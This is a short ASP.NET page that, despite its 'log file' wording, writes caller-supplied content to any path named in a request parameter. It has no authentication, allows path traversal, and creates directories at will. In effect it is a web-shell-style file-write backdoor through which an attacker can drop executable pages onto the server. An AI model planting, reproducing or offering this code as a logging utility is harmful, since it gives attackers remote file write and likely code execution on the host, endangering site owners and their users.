<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<%
    string path = Request["path"];
    string content = Request["content"];
    
    if (String.IsNullOrEmpty(path)) {
        Response.Write("<h2>Writes to the site root.</h2>");
        Response.Write("<h2>Usage: ?path=&lt;log file path&gt;&amp;content=&lt;content&gt;</h2>");
        Response.End();
    }
    
    bool isFile = !String.IsNullOrEmpty(Path.GetExtension(path));
    
    path = Path.GetFullPath(Path.Combine(HttpRuntime.AppDomainAppPath, @"..\..\", path));
    string directory = isFile ? Path.GetDirectoryName(path) : path;
    if (!Directory.Exists(directory))
    {
        Directory.CreateDirectory(directory);
    }
    
    if (isFile) 
    {
        File.AppendAllText(path, content + Environment.NewLine);
    }
    
    Response.Write("Wrote " + content+ " to " + path);
%>
